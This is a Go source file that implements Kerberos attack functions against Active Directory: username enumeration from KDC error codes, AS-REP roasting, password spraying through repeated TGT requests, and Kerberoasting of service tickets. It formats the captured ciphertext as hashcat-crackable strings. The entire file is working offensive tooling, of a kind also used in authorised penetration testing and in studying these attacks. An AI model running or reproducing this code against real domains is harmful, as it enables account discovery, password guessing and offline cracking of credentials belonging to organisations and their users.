package krb

import (
	"encoding/hex"
	"fmt"
	"strings"

	kerberos "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
)

// UserExistsResult describes the outcome of a username probe.
type UserExistsResult struct {
	Username string
	Exists   bool
	// ASREP is set when the account does not require pre-auth (roastable).
	Roastable bool
}

// ASREPHash formats an ASREPRoastResult as a hashcat-crackable string
// ($krb5asrep$<etype>$<user>@<REALM>:<first16hex>$<resthex>).
func ASREPHash(r *kerberos.ASREPRoastResult) string {
	cipher := r.CipherText
	var checksum, data string
	if len(cipher) >= 16 {
		checksum = hex.EncodeToString(cipher[:16])
		data = hex.EncodeToString(cipher[16:])
	} else {
		checksum = hex.EncodeToString(cipher)
		data = ""
	}
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		r.EncryptionType, r.Username, r.Realm, checksum, data)
}

// TGSHash formats a TGS ticket's encrypted part as a hashcat-crackable string
// ($krb5tgs$<etype>$*<user>$<REALM>$<spn>*$<first16hex>$<resthex>).
func TGSHash(username, realm, spn string, etype int, cipher []byte) string {
	var checksum, data string
	if len(cipher) >= 16 {
		checksum = hex.EncodeToString(cipher[:16])
		data = hex.EncodeToString(cipher[16:])
	} else {
		checksum = hex.EncodeToString(cipher)
		data = ""
	}
	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		etype, username, realm, spn, checksum, data)
}

// UserEnum probes whether a username exists in the realm by sending an AS-REQ
// without pre-authentication and inspecting the KDC error code.
// KDC_ERR_C_PRINCIPAL_UNKNOWN (6) = user not found.
// KDC_ERR_PREAUTH_REQUIRED (25) = user exists (account requires preauth).
// No error + result returned = user exists and is ASREPRoastable.
func UserEnum(username, realm, kdcHost string) (*UserExistsResult, error) {
	result, err := kerberos.ASREPRoast(username, realm, kdcHost)
	if err != nil {
		errStr := err.Error()
		if strings.Contains(errStr, "not found in realm") {
			return &UserExistsResult{Username: username, Exists: false}, nil
		}
		if strings.Contains(errStr, "requires pre-authentication") {
			return &UserExistsResult{Username: username, Exists: true, Roastable: false}, nil
		}
		return nil, err
	}
	_ = result
	return &UserExistsResult{Username: username, Exists: true, Roastable: true}, nil
}

// ASREPRoastUser requests an AS-REP without pre-authentication for username.
// Returns nil if the account requires pre-auth or does not exist (not an error for
// batch roasting; the caller should check the error message).
func ASREPRoastUser(username, realm, kdcHost string) (*kerberos.ASREPRoastResult, error) {
	return kerberos.ASREPRoast(username, realm, kdcHost)
}

// SprayPassword attempts to get a TGT for username/password. Returns true if
// authentication succeeded.
func SprayPassword(username, password, realm, kdcHost string) (bool, error) {
	c := kerberos.NewClient(username, realm, kdcHost).WithPassword(password)
	err := c.GetTGT()
	c.Destroy()
	if err != nil {
		errStr := err.Error()
		// "wrong password" or "account locked / disabled" are auth failures, not
		// network errors. We surface the message to the caller but return false.
		if strings.Contains(errStr, "KDC error") ||
			strings.Contains(errStr, "GetTGT failed") ||
			strings.Contains(errStr, "PREAUTH") {
			return false, fmt.Errorf("%s", errStr)
		}
		return false, err
	}
	return true, nil
}

// KerberoastSPN requests a service ticket for spn using valid credentials and
// returns the ticket's encrypted part formatted for hashcat ($krb5tgs$...).
func KerberoastSPN(username, password, realm, kdcHost, spn string) (string, error) {
	c := kerberos.NewClient(username, realm, kdcHost).WithPassword(password)
	if err := c.GetTGT(); err != nil {
		c.Destroy()
		return "", fmt.Errorf("GetTGT: %w", err)
	}
	ticket, _, _, err := c.GetTGS(spn, false)
	c.Destroy()
	if err != nil {
		return "", fmt.Errorf("GetTGS(%s): %w", spn, err)
	}
	return TGSHash(username, strings.ToUpper(realm), spn, ticket.EncPart.EType, ticket.EncPart.Cipher), nil
}
